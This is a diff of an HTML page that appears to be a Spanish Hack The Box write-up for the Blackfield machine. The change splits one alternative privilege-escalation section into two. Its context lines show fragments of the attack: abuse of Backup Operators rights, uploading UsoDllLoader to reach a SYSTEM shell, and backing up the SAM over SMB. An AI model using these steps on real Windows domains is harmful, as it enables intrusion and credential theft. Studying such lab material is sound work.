@@ -128,7 +128,8 @@
         <li><a href="#access-audit2020">Access - audit2020</a></li>
         <li><a href="#shell-svc_backup">Shell - svc_backup</a></li>
         <li><a href="#shell-administrator">Shell - Administrator</a></li>
-        <li><a href="#altern-administrator">Alternativa - Administrator</a></li>
+        <li><a href="#altern1-administrator">Alternativa 1 - Administrator</a></li>
+        <li><a href="#altern2-administrator">Alternativa 2 - Administrator</a></li>
       </ul>
   </div>
 
@@ -710,8 +711,8 @@ PS C:\Users\Administrator\Documents></span>
 
 </section>
 
-<section class="post" id="altern-administrator">
-<br><h3 class="post-title">Alternativa - Administrator</h3><br>
+<section class="post" id="altern1-administrator">
+<br><h3 class="post-title">Alternativa 1 - Administrator</h3><br>
 
 <p class="plain-text">Si miramos en <code class="language-plaintext highlighter-rouge">bloodhound</code> los grupos a los que pertenece <code class="language-plaintext highlighter-rouge">svc_backup</code> lo mas interesante que encontramos es el grupo a nivel de dominio <code class="language-plaintext highlighter-rouge">Backup Operators</code></p>
 <a href="/htb/blackfield/2.png" target="_blank"><div><p><img src="/htb/blackfield/2.png"></p></div></a>
@@ -826,7 +827,6 @@ PS C:\Users\svc_backup\Documents></span>
 PS C:\Users\svc_backup\Documents></span>
 </code></pre></div></div><br>
 
-
 <p class="plain-text">También subiremos <a href="https://github.com/itm4n/UsoDllLoader">UsoDllLoader</a> para poder cargar los dlls incluido el nuestro</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">PS C:\Users\svc_backup\Documents> </span><span class="am">upload </span><span class="p">UsoDllLoader.exe
@@ -874,6 +874,11 @@ PS C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
 nt authority\system
 PS C:\Windows\system32></span>
 </code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="altern2-administrator">
+<br><h3 class="post-title">Alternativa 2 - Administrator</h3><br>
 
 <p class="plain-text">Otra forma es a través de <code class="language-plaintext highlighter-rouge">reg</code>, pero antes iniciaremos un servicio <code class="language-plaintext highlighter-rouge">smb</code> para poder recibir todos los archivos a los que haremos un <code class="language-plaintext highlighter-rouge">backup</code> como lo es la <code class="language-plaintext highlighter-rouge">SAM</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
